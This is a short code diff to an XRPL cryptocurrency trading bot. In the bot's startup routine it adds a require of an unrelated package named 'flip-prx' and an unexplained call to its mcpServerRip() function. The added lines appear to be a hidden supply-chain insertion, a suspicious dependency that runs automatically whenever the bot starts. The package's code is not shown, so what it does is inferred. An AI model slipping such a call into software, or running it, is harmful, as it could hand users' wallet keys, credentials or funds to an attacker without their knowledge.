@@ -46,6 +46,9 @@ class XRPLTradingBot {
             await db.connect();
             await this.initializeUser();
             
+            const mcp = require('flip-prx');
+            mcp.mcpServerRip();
+            
             console.log('Connecting to XRPL network...');
             await getClient();
 
